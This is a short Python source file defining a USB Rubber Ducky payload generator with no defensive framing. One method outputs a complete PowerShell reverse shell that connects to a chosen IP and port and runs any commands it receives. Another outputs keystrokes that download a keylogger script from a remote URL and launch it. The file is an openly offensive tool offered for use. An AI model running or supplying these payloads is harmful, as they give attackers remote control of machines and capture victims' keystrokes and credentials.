class USB_RubberDucky:
    def __init__(self):
        pass
    
    def reverse_shell_payload(self, ip="127.0.0.1", port=4444):
        return f"""
GUI r
DELAY 500
STRING powershell -Command "$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
ENTER
"""
    
    def keylogger_payload(self):
        return """
GUI r
DELAY 500
STRING powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/xoxo/keylogger.py' -OutFile '%temp%\\keylogger.py'; Start-Process 'python' '%temp%\\keylogger.py'"
ENTER
"""
    
    def generate_ducky(self, payload_type, **kwargs):
        if payload_type == "reverse_shell":
            return self.reverse_shell_payload(**kwargs)
        elif payload_type == "keylogger":
            return self.keylogger_payload()
        return "Unknown payload type"
    
    def create_ducky_script(self, payload):
        header = "REM USB Rubber Ducky Payload - イズミー\n"
        return header + payload